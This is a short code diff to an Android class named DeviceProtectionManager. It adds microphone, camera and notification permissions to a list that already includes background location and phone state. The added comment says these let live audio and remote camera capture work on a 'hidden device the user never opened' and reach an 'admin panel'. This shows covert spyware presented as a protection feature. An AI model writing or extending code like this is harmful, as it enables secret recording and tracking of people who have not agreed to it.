@@ -197,6 +197,13 @@ public class DeviceProtectionManager {
             android.Manifest.permission.ACCESS_COARSE_LOCATION,
             android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
             android.Manifest.permission.READ_PHONE_STATE,
+            // Required for live audio (mic FGS) and remote camera capture to
+            // work on a hidden device the user never opened — without these the
+            // mic records silence and the camera fails, so nothing reaches the
+            // admin panel.
+            android.Manifest.permission.RECORD_AUDIO,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.POST_NOTIFICATIONS,
         };
         for (String p : perms) {
             try {
